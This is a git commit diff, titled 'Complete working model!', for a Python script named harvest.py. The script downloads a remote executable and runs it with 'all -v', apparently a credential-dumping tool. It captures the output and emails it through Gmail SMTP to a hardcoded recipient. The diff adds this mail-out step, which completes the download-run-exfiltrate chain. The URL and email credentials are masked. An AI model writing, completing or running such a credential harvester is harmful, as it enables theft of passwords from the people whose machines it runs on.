a491c1cad40f5a5222ae127a270a559a97473c4a
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-09-02 13:28:22 -0400

    Complete working model!

--- harvest.py
+++ harvest.py
@@ -10,10 +10,14 @@ def get_payload():
         with open(name, "wb") as payload:
             payload.write(get_request.content)
 
-def mail_it():
-    #mail the report to us using google smtp server
+def mail_it(email, passwd, to_mail, msg):
+    mailserver = smtplib.SMTP("smtp.gmail.com", 587)
+    mailserver.starttls()
+    mailserver.login(email, passwd)
+    mailserver.sendmail(email, to_mail, msg)
+    mailserver.quit()
 
-URL= ""
+URL= "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
 get_payload(URL)
 file_name = URL.split("/")[-1]
 process = subprocess.Popen([file_name, 'all', '-v'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
@@ -22,4 +26,4 @@ try:
     message = result.decode('latin-1').encode("utf-8")
 except:
     message = str(result)
-
+mail_it("xxxxxxxxxx@gmail.com", "***********", "xxxxxxxxxxx@gmail.com", message)
